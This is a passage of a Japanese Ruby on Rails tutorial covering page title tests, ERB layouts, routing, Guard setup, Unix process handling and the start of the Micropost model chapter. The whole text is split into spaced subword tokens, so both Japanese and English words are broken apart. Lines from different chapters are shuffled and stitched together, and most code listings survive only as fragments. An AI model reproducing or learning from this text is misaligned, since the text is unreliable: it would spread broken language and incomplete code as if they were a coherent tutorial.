▁ 本書 では 以後 、 この アプリ の 良い 点 を 保 ち つ つ 、 弱 点 を ひとつ ひとつ 克服 していきます 。
▁ 表 \ ref { table : static _ pages } の 各 タイトル について 簡単な テストを 書き ます ▁( リスト \ ref { code : about _ test })。 この テスト で 使用している \ ko de { assert \_ select } メソッド では 、 特定の HTML タグ が存在する かどうか をテストします ▁( この種の アサーション メソッドは その 名 から 「 セ レ ク タ 」 と呼ばれる こともあります )
▁< n >< n >\ subsection { 本 章 の まとめ } ▁% ▁( fold )< n >\ label { sec : toy _ app _ what _ w e _ learn ed _ in _ this _ chapter }< n >< n >\ begin { item ize }< n >< n >\ item
▁" Home ▁| ▁Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁A p p "
▁S ca f fold 機能 で コードを 自動生成 すると 、 Web の あらゆる 部分 から モデル データ にアクセス して やりとり できるように な る 。
▁上の セ レ ク タ は 、\ ko de { < title > } タグ 内に 「 Home ▁| ▁Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁A p p 」 という 文字列 がある かどうかをチェックし ます 。
▁ 同じ要領で 3 つの 静的ページ を 書き 換 え ます ▁( リスト \ ref { code : title _ tests })。
▁S ca f fold は 何 よりも 手 っ 取り 早 い の が と り え だ が 、 これ を元に Rails を理解する には 向 い ていない 。
▁Rails では Web アプリケーションの 構成 に MVC ▁( Model - View - Controller ) ▁という モデル を 採 用 している 。
▁ StaticPages コントローラの タイトル をテストする
▁Rails が 解 釈 する REST には 、 標準的な URL セット と 、 データモデル と やりとり するための コントローラ アクション が含まれ ている 。
▁Rails では データ のバリデーション ▁( validation ) ▁ が サポート され ており 、 データモデル の 属性 の値 に 制限 を かけ る ことができる 。
▁Rails には 、 さまざまな データモデル 同士 を 関連付け を定義する ための 組み込み 関数 が 多 数 用意されてい る 。
▁Rails コンソール を使用すると 、 コマンドライン から Rails アプリケーション と やりとり する ことができる 。
▁リスト \ ref { code : validates _ content _ presence } のコード には マイクロポストの 存 在 確認 用の バリデーション の 追加 方法 が 示 されています 。 これは 、 マイクロポスト が 空 欄 に なら ないように する ためのものです 。
▁ 図 \ ref { fig : micropost _ content _ ca n t _ b e _ blank } と同じ 表示 になる こ t 確認 してください 。
▁リスト \ ref { code : toy _ user _ presence _ v a li cat ions } を 次のように 更新 してください : ▁\ ko de { F I L L \_ IN } の 部分を 適切な コード に置き換え 、 User モデル の名前 属性 と メール 属性 が存在する かどうか のバリデーション を 行える ようにします ▁( 図 \ ref { fig : user _ presence _ validations })。
▁( 上の テストコード で 繰り返し 使われ ている 「 Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁A p p 」 という 文字列を 一 刻 も 早 く リファクタリング した く て た ま らない 方 には 、\ ref { sec : static _ pages _ exercises } の 演習 を お す す め します 。 )
▁ マイクロポストの コンテンツ が存在し ている かどうか のバリデーション コード
▁ マイクロポストの 存 在 確認 バリデーション の 結果
▁$ ▁bundle ▁exec ▁rake ▁test < n > 3 ▁ tests , ▁ 6 ▁ assert ions , ▁3 ▁ failure s , ▁0 ▁ errors , ▁0 ▁ skip s
▁User モデルに 存 在 確認 バリデーション を追加する
▁今度は 各 ページに タイトル を追加して 、\ ref { sec : testing _ title s } の テストが パス する ように しましょう 。
▁リスト \ ref { code : html _ structure } の 基本 HTML 構造 を カスタム の Home ページ ▁( リスト \ ref { code : custom _ home _ page }) ▁ に追加する と ▁( リスト \ ref { code : home _ view _ full _ html } のようになります 。
▁User モデルの 存 在 確認 バリデーション の 結果
▁ 完全な HTML 構造 を 備 え た Home ページの ビュー
▁This ▁is ▁the ▁ home ▁ page ▁for ▁the
▁ sample ▁ application .
▁この ページの 表示 を 図 \ ref { fig : home _ view _ full _ html } に示します
▁ 本書 の ス ク リ ー ン シ ョ ッ ト では 原 則 として Google ▁C h r o me を使用しています が 、 C h r o me の タブ は タイトル を表示し き れ ないので 、 図 \ ref { fig : home _ view _ full _ html } では 代わりに S a fa ri を使用しています 。
▁ タイトル が 付 いた Home ページ
▁ Help ページ ▁( リスト \ ref { code : custom _ help _ page }) ▁ や About ページ ▁( リスト \ ref { code : custom _ about _ page }) ▁ についても 、 同じ要領で リスト \ ref { code : help _ view _ full _ html } ▁ や ▁リスト \ ref { code : about _ view _ full _ html } のような コード に変更 します 。
▁ The ▁ view ▁for ▁the ▁ Help ▁ page ▁with ▁ full ▁ HTML ▁ structure .
▁ G e t ▁ help ▁on ▁the ▁Ruby ▁on ▁Rails ▁Tutorial ▁ at ▁the
▁ To ▁get ▁ help ▁on ▁this ▁ sample ▁app , ▁ s e e ▁the
▁Ruby ▁on ▁Rails ▁3.2 ▁ チュートリアル
▁ 完全な HTML 構造 を 備 え た About ページの ビュー
▁< n > ▁This ▁is ▁the ▁ sample ▁ application ▁for ▁the ▁ tutorial .
▁これで テストスイート は ▁\ passing ▁ になるはずです 。
▁$ ▁bundle ▁exec ▁rake ▁test < n > 3 ▁ tests , ▁ 6 ▁ assert ions , ▁0 ▁ failure s , ▁0 ▁ errors , ▁0 ▁ skip s
▁この節では 、 Rails の コントローラ と アクション を使って 3 つの 有効な ページ を生成する ことで さまざまな ことを 達 成 しました 。 しかし それら は 単純な 静的ページ であり 、 また Rails の 能 力 を 十分 に 発 揮 でき て いません 。
▁ しか も 、 コードが 甚 だ しく 重複 しています 。
▁ ページの タイトル が ど れ も ほぼ 同じ ▁( 完全に では ない が )。
▁ 「 Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁A p p 」 という 文字 が 3 つの タイトル で 繰り返し 使われ ている 。
▁ HTML の 構造 全体 が 各 ページ で 重複 している 。
▁ 同じ コードを 繰り返す ことは Ruby の 「 D R Y 」( D on ' t ▁ Re p e at ▁ Y our self : ▁ 繰り返す べ から ず ) ▁という 原 則 に 反 します 。 この節 では 、 繰り返し を 追 放 して コードを D R Y ▁( = よく 乾 か す ) ▁ に しましょう 。
▁最後に \ ref { sec : adding _ page _ title s } のテスト を実行して 、 タイトル を 壊 していない ことを確認します 。
▁上の 話 と 一 見 矛 盾 する よう ですが 、 最初に コードを 若 干 追加 して 、 現在 は 「 ほぼ 」 同じ になっている ページの タイトル を 「\ emph { 完全に }」 同じ に しておきます 。
▁この 方が 、 コードの 重複 を 一 括 で 取り 除 け る からです 。
▁ 重複 を 取り 除 く テクニック の ひとつ として 、 ビューで 「\ emph { 埋め込み Ruby } 」( E m b ed de d ▁Ruby ) ▁ を使用できます 。
▁ Home 、 Help 、 About ページに は 可 変 要素 が あるので 、 Rails の \ ko de { pro v id e } 関数 を使用して タイトル を ページ ごとに 変更 します 。
▁ これはリスト \ ref { code : home _ view _ erb _ title } で使用されていま した 。
▁ タイトル に ERB コード を使用した Home ページの ビュー
▁リスト \ ref { code : home _ view _ erb _ title } ▁ は 、\ emph { ERB } と 呼ばれ ている 、 Ruby の 埋め込み コード の最初の 例 です
▁Rails で の 開発 経験 者 であれば 、 この時点で \ ko de { content \_ for } の 使用 を 検 討 する と思います が 、 残念ながら Asset ▁Pipeline と 併 用 すると 正常に動作し ない ことがあります 。
▁\ ko de { pro v id e } 関数 は content \_ for の 代 替 です 。
▁Ruby を 勉 強 した こと のある 方 であれば 、 Rails は ブロック の内容 を \ emph { yield } している と 推測 する ことでしょう 。 そして 、 その 推測 は おそらく 正しい でしょう 。
▁しかし 、 Rails 開発 のために これら の詳細 を 知 る 必要はありません 。
▁ ERB で ビュー を この ように 書き 換 え ても 、 ページの 表示 結果 は 以前 と まったく 同じです 。 タイトル の 可 変 部分 が ERB によって 動的 に 生成 されている 点 だけ が 異なります 。
▁\ ref { sec : adding _ page _ title s } のテスト を実行して この 改 修 を 確認 すれば 、 今 度 も ▁\ passing ▁ になるはずです 。
▁続いて 、 Help ページ と About ページ も同様に 変更 します ▁( リスト \ ref { code : help _ view _ erb _ title } 、 リスト \ ref { code : about _ view _ erb _ title })。
▁ タイトル に ERB コード を使用した Help ページの ビュー
▁ タイトル に ERB コード を使用した About ページの ビュー
▁ タイトル の 可 変 部分を ERB を使って 置き換え たので 、 現在 それぞれの ページ は だ いた い 以下のような 構造 になっています 。
▁ 第 3 版 ▁ 目 次
▁ こう して 見 ると 、 HTML の 構造 は title タグ の内容 も 含 め て どの ページ も 完全に 同じです 。 異なる 点 がある と すれば 、\ ko de { body } タグ の 内 側 の コンテンツ だけです 。
▁この レイアウト ファイル を有効に するには 、 前 述 の デフォルトの タイトル 部分を 以下の ERB コード に 差 し 替 え ます 。
▁ 変更 の 結果 、 レイアウト ファイルは リスト \ ref { code : application _ layout } のようになります 。
▁上のコード にある 、 以下の 特殊な コード にご注目ください 。
▁このコードは 、 各 ページ の内容 を レイアウト に 挿 入 する ためのものです 。
▁Rails の デフォルトの レイアウト には 、 以下の行 が追加され ている ことに も ご 注 目 ください 。
▁上の 3 つの ERB は 、 それぞれ スタイルシート 、 JavaScript 、\ ko de { c s r f \_ me t a \_ tag s } メソッドを ページ 内で 展開 する ためのものです 。 スタイルシート と JavaScript は 、 Asset ▁Pipeline ▁(\ ref { sec : the _ asset _ pipeline }) ▁ の一部 です 。 c s r f \_ me t a \_ tag s は 、 Web 攻撃 手法 の ひとつ である \ href { http :// en . w ikipedia . org / wiki / C r o s s - site _ request _ f org e ry } { ク ロ ス サイト リクエスト フ ォ ー ジ ェ リ ー } ▁( c r o s s - site ▁ request ▁for g e ry : ▁ CSRF ) を防ぐ ために 使われ る Rails の メソッド です 。
▁もちろん 、 リスト \ ref { code : home _ view _ erb _ title } 、 リスト \ ref { code : help _ view _ erb _ title } 、 ▁リスト \ ref { code : about _ view _ erb _ title } の ビュー には 、 レイアウト と 重複 する HTML が まだ 残 っている ので 、 それら を削除し て 、 内部 の コンテンツ だけ 残 します 。
▁この 改 修 が 終 わ ると 、 ▁リスト \ ref { code : home _ view _ in ter i or } 、 リスト \ ref { code : help _ view _ in ter i or } 、 リスト \ ref { code : about _ view _ in ter i or } のように 実 に 簡潔 で 美 しい コード になります 。
▁ HTML 構造 を削除し た Home ページ
▁ HTML 構造 を削除し た Help ページ
▁ HTML 構造 を削除し た About ページ
▁上の ように 定義された ビュー は 、 Home 、 Help 、 About ページの 表示 は 以前 と 変 わ り ません が 、 コードの 重複 が 大きく 削 減 されました 。
▁ この節 で 行った ような ち っ ぽ け な リファクタリング です ら 、 実際に や っ てみると 大 小 さまざまな エラーが発生し ます 。 ベ テ ラ ン 開発者 ほど この ことを 骨 の 髄 まで 理解 し ており 、 どんな 小さな リファクタリング でも あ など った り しません 。
▁ テストスイート を き ち ん と 整 備 しておくこと が い か に 重要 である か 、 皆 さ ん にも ご 理解 いた だけ る と思います 。
▁ 開発 の ご く 初期 の 段 階 なら 全 ページを 目 視 で ひとつ ひとつ 確認 して 回 ること も できる かもしれませんが 、 そ ん な 方法 では じ き に 手 に 負 え なくなります 。 この アプリ では 必要な テストスイート が 整 備 されている ので 、 今 度 も ▁\ passing ▁ になる ことを確認する だけで O K です 。
▁もちろん 厳 密 に 言 えば 、 テストが パス した という だけで は その コードが 本当に 正しい の かどうか の \ emph { 証 明 } には なり ません 。 しかし 正しい コード に 確 実 に 近 づ く ことができ 、 正しい 可能性 も 上 が ります 。 何 よりも 、 テスト があれば 今後 発生 する バグ を防ぐ ための セ ー フ テ ィ ネ ッ ト になります 。
▁ サイトの ページの カスタマイズ が 終わっ て 、 テストスイート も 軌 道 に 乗 って き たので 、 今 のうち に アプリケーション ルート の ルーティング を 設定 しておきましょう 。
▁\ ref { sec : hello _ world } と \ ref { sec : mvc _ in _ action } で や った ように 、 ルーティング を設定する には \ ko de { routes . rb } ファイルを 編集 して 、 ルート 「 / 」 と Web ページを 結 び 付け ます 。 結 び 付け る 相手 は Home ページ です
▁(\ ref { sec : sample _ app _ setup } で Application コントローラに \ ko de { hello } アクション を追加した 場合は 、 今 のうち に アクション を削除し ておく ことを お す す め します )。
▁ 変更 結果を リスト \ ref { code : home _ root _ route } に示します 。 ここでは 、 リスト \ ko de { hello } の \ ko de { get } ▁ ルール を 以下のコード に置き換え ています 。
▁ 変更 後 の ルーティング ファイルを 図 \ ref { fig : home _ root _ route } に示します 。
▁ Home ページを ルート URL に設定する
▁ ルート URL にアクセス すると Home ページ が表示される
▁もちろん そ ん な ことはありません 。 皆 さ ん は この章 で Rails の コントローラ 、 アクション 、 ビュー の 開発 を ひ と とおり 行った ことで 、 これ から 動的な コンテンツ を ど し ど し サイト に追加 するための 準備 が す っかり 整 った のです 。
▁ 残 る 課題 は 、 皆 さ ん が この チュートリアル を い か に 最 後 まで や り ぬ く か 、 それ だけ である と 言 って よいでしょう 。
▁ 次の 章 に進む前に 、 差 分 を コミット して master ブランチ に マージ しておきましょう 。
▁\ ref { sec : static _ pages } では 、 静的ページ の 開発 のための Git ブランチ を 用 意 しました 。
▁ ここ まで の 作業 内容 を コミット していない 場合 、 作業 の 区切 り を つ け るために も コミット しましょう 。
▁次に master ブランチ に移動し 、\ ref { sec : git _ command s } と 同じ要領で 差 分 を マージ します 。
▁ コミット 時に 「 マージ すると Spring の プロセス ID ▁( p id ) ▁ ファイルが 上 書き される 可能性があります 」 のような エラーメッセージ が表示される 場合は 、 コマンドライン で \ ko de { rm ▁- f ▁* . p id } を実行して p id ファイルを 削除 してください 。
▁この ように 中 継 点 まで 達 した ら 、 コードを リモート リポジトリ に アップロード しておく と よいでしょう ▁(\ ref { sec : bitbucket } の 手順 に従って い れば 、 リモート リポジトリ は B it B u c ke t を使用すること になる でしょう )。
▁また 、 この時点で Heroku に デプロイ して み ても よいでしょう 。
▁ デプロイ する 前に テストを 走 ら せ ています が 、 こういった 習慣 を 身 に つ け ておく と 開発 に 役 立 ち ます 。
▁< n >< n >\ subsection { 本 章 の まとめ } ▁% ▁( fold )< n >\ label { sec : static _ pages _ what _ w e _ learn ed _ in _ this _ chapter }< n >< n >\ begin { item ize }< n >< n >\ item
▁ 新しい Rails アプリケーションを ゼ ロ から 作成した のは これ で 3 度 目 。 今回 も 必要な gem の インストール 、 リモート リポジトリ への プッシュ 、 production 環境 まで 行った 。
▁ コントローラ を 新規作成 するための \ ko de { rails } の スクリプト は \ ko de { rails ▁ generate ▁ controller ▁ Controller Name ▁< action ▁name ▁( 省略 可 ) > } 。 訳 注 : ▁ コントローラ 名 は キ ャ メ ル ケース 、 アクション 名 は ス ネ ー ク ケース にする 。
▁ 新しい ルーティング は \ ko de { config / routes . rb } ファイル で 定義 する 。
▁ 常に 自動 化 テスト を使用して 新 機能 開発 を 進め ること で 、 自 信 を 持 って リファクタリング できるように なり 、 回 帰 バグ も い ち は や く キャッチ できるように な る 。
▁ テスト駆動開発 では 「 レ ッ ド ・ グ リ ー ン ・ リファクタリング 」 サ イ ク ル を 繰り返す 。
▁Rails の レイアウト では 、 アプリケーションの ページの 共通 部分を テンプレート に置く ことで コードの 重複 を 解決 する ことができる 。
▁ 以後 本チュートリアル の 演習 を 解 く 際に は 、 以下のように 演習 用 トピックブランチ を 別 途 作成 して そこで 行う ことを お す す め します 。
▁ トピックブランチ を 分 け ておく ことで 、 チュートリアル 本 編 と の 食 い 違 い を避ける ことができます 。
▁ 満 足 の ゆ く 解 が できた ら 、 リモート リポジトリ に プッシュ しても よいでしょう ▁( リモート リポジトリ がある場合 )。
▁( 最後の 行 では 、 この後 の 開発 準備 のために master ブランチ を チェック ア ウ ト しています が 、 チュートリアル 本 編 への 影 響 を避ける ため 、 演習 で 行った 変更 は master に マージ \ emph { していません })。
▁ 今後 の 章では 、 ブランチ や コミット メッセージ は もちろん 異なります が 、 基本的な アイディア は 同じです 。
▁ StaticPages コントローラの テスト ▁( リスト \ ref { code : title _ tests }) ▁ にも 重複 がある ことに お 気 付き でしょう か 。
▁ 特に 「 Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁A p p 」 を 全 て の タイトル テスト で そのまま 使 っています 。 専 用の \ ko de { setup } 関数 ▁( テスト の設定 用 関数 、 個 別の テスト の 前に 必ず 毎 回 実行される ) ▁ を使用して この 重複 を 解 消 し 、 テスト 修正 後 も リスト \ ref { code : base _ title _ test } の テストが ▁\ passing ▁ になる ことを確認します
▁( なお 、 リスト \ ref { code : base _ title _ test } では \ emph { インスタンス変数 } ▁(\ ref { sec : mvc _ in _ action } と \ ref { sec : a _ user _ class }) ▁ と \ emph { 文字列 の 式 展開 } ▁(\ ref { sec : string s } を使用しています )。
▁ サンプルアプリケーション に Contact ▁( 問 い 合わせ 先 ) ▁ ページ を作成 してください 。
▁この 演習 は \ ref { sec : contact _ page } の 節 に 解 答 があります 。
▁\ ref { sec : g re en } で About ページに や った の と同じ ように 、 Contact ページに も リスト \ ref { code : pro p o s ed _ contact _ page } の コンテンツ を表示し ましょう
▁( リスト \ ref { code : pro p o s ed _ contact _ page } には リスト \ ref { code : base _ title _ test } のような 修正 は 行 わ れ ていない ので 、 そのまま コ ピ ペ しても 動 き ません )。
▁ 基本 タイトル を含め た StaticPages コントローラの テスト
▁ Contact ページ で使用する コード
▁この 追加 の 節 は 、\ href { http :// sc re en casts . railstutorial . org /}{ Ruby ▁on ▁Rails チュートリアル スクリーンキャスト シ リ ー ズ } ▁( 原 著者 の 主 催 する 有 料 スクリーンキャスト : ▁ 英語 のみ ) ▁ で使用する テスト 用 設定 について解説します 。
▁ 大きく 3 つ に 分 か れ ます : ▁ 高度な パス / 失敗 表示 ▁(\ ref { sec : mini test _ re port er s }) 、 テスト 失敗 時の 大 量 の バ ッ ク ト レ ー ス メッセージ を フィルタ する ユ ー テ ィ リ テ ィ ▁(\ ref { sec : b ack tr a ce _ s il en c er }) 、 ファイルの 変更を 検出 して 、 必要な テスト だけ を 自動 実行 し てくれる 「 自動 テスト 実行 ユ ー テ ィ リ テ ィ 」( \ ref { sec : guard })。
▁ この節 で 参 考 まで に示した コードは それ なり に 高度な ので 、 今 すぐ 理解 できるように な る 必要はありません 。
▁ この節 の 変更 は master ブランチ で 行う 必要があります 。
▁リスト \ ref { code : mini test _ re port er s } のコード には 、 シ ング ル ク オ ー テ ー ション ▁( ') ▁ と ダ ブ ル ク オ ー テ ー ション ▁( ") ▁ の 両方 が 含まれています 。
▁Ruby では 、 この 2 つの ク オ ー テ ー ション を 併 用 すること が 一般的 です 。 詳 しく は \ ref { sec : string s } で 解説します 。
▁ これはリスト \ ref { code : gemfile _ sample _ app } で使用されていま した 。
▁ テストが 失敗した 時に 、 テスト 失敗 の 道 筋 を アプリケーション 全体 に わ た って た ど る ス タ ッ ク ト レ ー ス ▁( バ ッ ク ト レ ー ス ) ▁ が表示されます 。
▁ バ ッ ク ト レ ー ス は 問題 を 追 跡 する う え では 非常に 便利な のですが 、 クラウド IDE など 一部の システム では 、 この ト レ ー ス が gem の 依 存 関係 や Rails 自身 に まで 及 ぶ ことがあります 。
▁ そう な ると 大 量 の ス タ ッ ク ト レ ー ス が 出力 されて 非常に 不 便 です 。 gem の 依 存 関係 を調べ ている の でも なければ 、 開発 している アプリケーションで 問題 の 原 因 を 追 跡 中に 大 量 の メッセージ が 出力 されて も 、 邪 魔 な だけです 。
▁ こう した 不要な 出力 行 を 除 去 するために 、 バ ッ ク ト レ ー ス を フィルタ します
▁これ を行う には \ href { https :// github . com / me t as kill s / mini _ b ack tr a ce }{\ text tt { mini \_ b ack tr a ce } } ▁gem ▁( リスト \ ref { code : gemfile _ sample _ app }) ▁ と \ emph { b ack tr a ce ▁ s il en c er } を 組み合わせ ます 。
▁ クラウド IDE の場合 、 そう した 不要な 行 では ほとんど の場合 \ ko de { r v m } ▁( = Ruby ▁ V er s ion ▁Ma n age r ) ▁という 文字 が パス に 含 まれ ている ので 、 これを 利用 して フィルタ します ▁( リスト \ ref { code : b ack tr a ce _ s il en c er })。
▁ RVM を フィルタ する b ack tr a ce ▁ s il en c er を追加する
▁# ▁B e ▁ s ur e ▁to ▁ re start ▁your ▁ server ▁ w h en ▁you ▁ mod if y ▁this ▁ file .
▁# ▁Rails . b ack tr a ce _ c le an er . remove _ s il en c er s !
▁リスト \ ref { code : b ack tr a ce _ s il en c er } の コメント 冒 頭 にある ように 、 b ack tr a ce ▁ s il en c er を追加した 後 は 必ず Rails ▁ web サーバーを再起動 してください 。
▁\ ko de { rake ▁test } コマンド は 、 テストを する 度 に コマンドライン に移動し て 手動で コマンド を実行し なければならない 点が 面倒 です 。
▁この 不 便 さ を 取り 除 く ために 、\ href { https :// github . com / guard / guard }{\ emph { Guard } } を使って テストを 自動的に 実行 させる ように してみましょう 。
▁ Guard は 、 ファイル システム の 変更を 監 視 し 、 たとえば \ ko de { static \_ pages \_ test . rb } ファイル など を変更する と 自動的に テスト を実行し てくれる ツール です 。
▁$ ▁bundle ▁exec ▁ guard ▁in it < n > W r it ing ▁ new ▁ Guard file ▁to ▁ / home / ub un t u / w or k space / sample _ app / Guard file < n > 00 : 5 1 : 3 2 ▁- ▁INFO ▁- ▁ mini test ▁ guard ▁ add ed ▁to ▁ Guard file , ▁f e e l ▁ free ▁to ▁ edit ▁it
▁ 統合テスト と ビュー が 更新 された ら 自動的に 適切な テストが 実行される ように 、 生成された \ ko de { Guard file } を 編集 します ▁( リスト \ ref { code : guard file })。
▁( や や 長 く て 応 用 的な 設定 なので 、 リスト \ ref { code : guard file } を コ ピ ペ して し ま った 方が よいでしょう )
▁ カスタマイズ した \ ko de { Guard file } .
▁# ▁D e f in es ▁the ▁ match ing ▁ r ul es ▁for ▁ Guard .
▁上のコード にある 以下の行 にご注目ください 。
▁この 行 では Guard から Spring サーバー を使用して 読み込み 時間 を 短縮 しています ▁( Spring は Rails の 機能 の ひとつ です )。 また 、 開 始 時に テストスイート を フル で 実行 しない よう Guard に 指示 しています 。
▁ Guard 使用 時の Spring と Git の 競 合 を防ぐ には 、\ ko de { . gitignore } ファイルに \ ko de { s p r ing / } ディレクトリ を追加します 。 . gitignore は Git の設定 ファイルの ひとつ で 、 ここで 指定された ファイルは Git レ ポ ジ ト リ に追加 され なくなります 。
▁ クラウド IDE では 以下の 操作 を行います 。
▁ ナビゲーション パ ネ ル の 右 上の にある 歯 車 ア イ コ ン を クリック します ▁( 図 \ ref { fig : file _ n a v ig at or _ g e ar _ i con })。
▁[ S h o w ▁ h id de n ▁ file s ] ▁ を 選択 して 、 アプリケーションの ルート ディレクトリ にある \ ko de { . gitignore } ファイル を表示します ▁( 図 \ ref { fig : show _ h id de n _ file s }) .
▁\ ko de { . gitignore } ファイル ▁( 図 \ ref { fig : gitignore }) ▁ を ダ ブ ル クリック して 開 き 、 リスト \ ref { code : gitignore _ s p r ing } のように 更新 します 。
▁ ファイル ナ ビ ゲ ー ター にある ▁( あ まり 目 立 た ない ) ▁ ギ ア の ア イ コ ン
▁ ファイル ナ ビ ゲ ー ター 内の 隠 し ファイル を表示する
▁ 隠 れ ている \ ko de { . gitignore } ファイル を表示する
▁\ ko de { . gitignore } に Spring を追加する
▁# ▁S e e ▁ https :// help . github . com / articles / ig n or ing - file s ▁for ▁more ▁ about ▁ ig n or ing < n > # ▁ file s .
▁< n > # < n > # ▁I f ▁you ▁ find ▁your self ▁ ig n or ing ▁ te m p or ary ▁ file s ▁ generated ▁ by ▁your ▁ text ▁ edit or < n > # ▁ or ▁ o per at ing ▁ s y st e m , ▁you ▁ pro b a b ly ▁ w an t ▁to ▁ add ▁a ▁ g lo b al ▁ ig no re ▁in st e ad : < n > # ▁git ▁config ▁-- g lo b al ▁ core . ex c l u de s file ▁' ~ / . gitignore _ g lo b al ' < n >< n > # ▁I g no re ▁bundle r ▁config .
▁< n > / . bundle < n >< n > # ▁I g no re ▁the ▁ default ▁ SQLite ▁ database .
▁< n > / db / * . sqlite 3 < n > / db / * . sqlite 3 - j our n al < n >< n > # ▁I g no re ▁ all ▁ log file s ▁and ▁ te m p file s .
▁< n > / log / * . log < n > / t m p < n >< n > # ▁I g no re ▁ Spring ▁ file s .
▁ Spring サーバー は 本 節 の 執 筆 時点 では 若 干 不 安 定 な 点が 残 って いて 、 Spring の \ emph { プロセス } が 起動 した ま ま 多 数 残 留 すると 、 テスト の パ フ ォ ー マ ン ス が 低 下 してしまう ことがあります 。
▁ Unix の プロセス
▁ L in u x や OS ▁X などの Unix 系 システム は 、 ユーザー タスク や システム タスク は \ emph { プロセス ▁( process ) } ▁ と呼ばれる 一 種 の コ ン テ ナ の 内部で 実行されます 。
▁ システム 上で 動 い ている すべての プロセス は 、\ text tt { p s } コマンド に \ text tt { a u x } オプションを 付け て 実行 することで 確認 できます 。
▁$ ▁ p s ▁a u x
▁ プロセス の 種類 を指定して フィルタ するには 、\ text tt { p s } の 結果を Unix の 「 パ イ プ 」 \ text tt { | } で つ ない で 、 パターン マッチ ャ ー である \ text tt { g re p } に 渡します 。
▁$ ▁ p s ▁a u x ▁| ▁ g re p ▁ s p r ing < n > ▁ ub un t u ▁1 22 4 1 ▁0 . 3 ▁0 . 5 ▁5 8 99 6 0 ▁ 17 8 4 16 ▁ ?
▁S s l ▁S e p 20 ▁1 : 4 6 < n > ▁ s p r ing ▁app ▁| ▁ sample _ app ▁| ▁ started ▁ 7 ▁ hour s ▁ ago
▁ 表示 結果 の中で 重要な のは 最初の 列 の 数値 です 。 これは \ emph { プロセス id } 、 略 して p id と呼ばれる ものです 。
▁ 不要な プロセス を 排 除 するには 、\ text tt { kill } コマンドで p id を 指定 し 、 Unix の kill コード ▁(\ href { https :// en . w ikipedia . org / wiki / Unix _ sign al # L ist _ of _ sign al s } { ここでは 9 ですが システム によって 異なります }) ▁ を 発 行 します 。
▁ 行 儀 の 悪 い Rails サーバー などの プロセス を kill する 際に は 、 上の ように ひとつ ず つ kill すること を お す す め します 。 Rails サーバー の p id を 知 る には 、\ text tt { p s ▁a u x ▁| ▁ g re p ▁ server }) など と 実行 します 。 しかし 時に は 特定の 名前 を持つ プロセス を まとめ て kill したい こともあります 。 し つ こ い \ text tt { s p r ing } プロセス た ち を ひとつ ず つ kill する のは 大 変 面倒 です 。
▁ 一 括 kill を行う には 、 最初に \ text tt { s p r ing } コマンド そのもの で プロセス を 停 止 しておく必要があります 。
▁$ ▁ s p r ing ▁ s to p
▁この コマンド が 効 か ないこと も 多 い ので 、 その とき は いよいよ \ text tt { p kill } コマンドで \ text tt { s p r ing } の名前 を指定して kill します 。
▁ Guard の設定 が完了し たら 、 新しい ターミナル を 開 き ▁(\ ref { sec : rails _ server } で や った ように Rails サーバー の ターミナル と 別 にする の が ポ イン ト です ) 、 以下 を コマンドライン で 実行 します
▁$ ▁bundle ▁exec ▁ guard
▁リスト \ ref { code : guard file } の ルール は 本チュートリアル に 最適化 した もの なので 、 たとえば コントローラの ファイル を変更する と 、 Guard は 即 座 に それ を 検出 して 、 その コントローラの 統合テスト を 自動 実行 します 。
▁ テスト を変更 ファイル だけ ではなく 、\ emph { フル } で 実行 したい場合は 、\ ko de { guard > } プロンプト で Re t ur n キー を 押 します
▁( このとき 、 Spring サーバー に 接続 できない などの エラーが表示され る ことがあります 。
▁ 問題 を修正する には 、 もう一度 Re t ur n キー を 押 します )。
▁ Guard を 終 了 するには Ctrl - D キー を 押 します 。 Guard に 他の マッチ ャ ー を追加する 方法 については 、 リスト \ ref { code : guard file } の例 、\ href { https :// github . com / guard / guard } { Guard ▁ README }、\ href { https :// github . com / guard / guard / wiki } { Guard ▁ wiki } を参照してください 。
▁ サンプルアプリケーションの コア 部分を 開発 するために 、 これまで に ユーザー 、 セッション 、 アカウント有効化 、 パスワード リセット という 4 つの リソース について 見 てきました 。 そして 、 これら のうち 「 ユーザー 」 という リソース だけ が 、 Active ▁Record によって データベース 上の テーブル と 紐 付 い ています 。
▁ 全 て の 準備 が 整 った 今 、 ユーザーが 短 い メッセージ を 投 稿 できるように するための リソース 「\ emph { マイクロポスト }」 を追加し ていきます
▁この 名前 は Twitter の \ emph { マ イ ク ロ ブログ } という 説明 分 から 着 想 を 得 ました 。 ブログ には ポ スト が あるので 、 マ イ ク ロ ブログ があれば マイクロポスト も ある 、 といった 具 合 です 。
▁ 第 \ ref { cha : a _ toy _ app } 章 で 簡 易 的な マイクロポスト 投 稿 フォーム に 触 れ ましたが 、 この章 では 、\ ref { sec : microposts _ resource } で 記述 した Micropost データモデル を作成し 、 User モデルと \ ko de { has \_ many } および \ ko de { belongs \_ to } メソッドを使って 関連付け を行い 、 さらに 、 結果を 処理 し 表示 するために 必要な フォーム と その 部品 を作成します ▁(\ ref { sec : micropost _ images } で 画像 の アップロード も 実装します )。
▁ 第 \ ref { cha : following _ users } 章では 、 マイクロポストの \ emph { フィード } を 受け 取 るために 、 ユーザーを \ emph { フォロー } する という 概念 を導入し 、 Twitter の ミ ニ ク ロー ン を 完成 させ ます 。
▁< n >< n > ▁\ section { Micropost モデル } ▁% ▁( fold )< n > ▁\ label { sec : a _ micropost _ model }< n >< n >
▁まずは Micropost リソース の 最も 本 質 的な 部分を 表現 する Micropost モデル を作成する ところ から 始 め ましょう 。
▁\ ref { sec : microposts _ resource } で作成した モデル と同様に 、 この 新しい Micropost モデル も データ 検証 と User モデルの 関連付けを 含 んで います 。
▁ 以前の モデルと は 違 って 、 今回の マイクロポスト モデル は 完全に テスト され 、 デフォルトの \ emph { 順序 } を 持 ち 、 また 親 である ユーザーが 破 棄 された 場合に は自動的に \ emph { 破 棄 } される ようにします 。
▁ Git ▁ を バージョン管理 に 使っている 場合は 、 いつものように トピックブランチ を作成 しておきましょう 。
▁ user - microposts
▁< n >\ end { code }< n >< n > ▁\ subsection { 基本的な モデル } ▁% ▁( fold )< n > ▁\ label { sec : the _ basic _ model }< n >< n >
▁ Micropost モデル は 、 マイクロポスト の内容 を保存する \ ko de { content } 属性 と 、 特定の ユーザー と マイクロポストを 関連付け る \ ko de { user \_ id } 属性 の 2 つの 属性 だけ を 持 ち ます 。
